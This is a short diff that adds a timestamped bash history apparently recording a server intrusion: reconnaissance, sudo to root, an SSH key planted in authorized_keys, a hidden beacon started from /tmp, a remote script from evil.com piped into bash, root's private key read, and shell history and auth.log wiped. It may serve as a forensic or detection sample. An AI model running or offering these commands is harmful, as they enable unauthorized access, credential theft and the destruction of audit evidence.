@@ -1,0 +1,22 @@
+#1764000000
+ls -la /etc
+#1764000010
+cd /var/www/html
+#1764000020
+cat /etc/passwd
+#1764000030
+whoami
+#1764000040
+sudo su root
+#1764000050
+echo "ssh-rsa AAAA..." >> /home/yushin/.ssh/authorized_keys
+#1764000060
+nohup /tmp/.x/beacon &
+#1764000070
+curl http://evil.com/payload.sh | bash
+#1764000080
+cat /root/.ssh/id_rsa
+#1764000090
+history -c
+#1764000100
+rm -rf /var/log/auth.log
